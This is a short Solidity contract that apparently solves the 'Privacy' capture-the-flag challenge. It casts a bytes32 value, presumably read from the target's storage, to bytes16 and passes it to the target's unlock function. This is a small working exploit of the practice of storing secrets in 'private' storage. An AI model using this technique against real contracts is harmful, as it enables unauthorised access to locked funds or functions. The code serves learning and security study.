// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
    function locked() external view returns (bool);
}

contract PrivacySolver {
    IPrivacy public target;

    constructor(address _targetAddress) {
        target = IPrivacy(_targetAddress);
    }

    function solve(bytes32 data2) public {
        bytes16 key = bytes16(data2);
        target.unlock(key);
    }
}
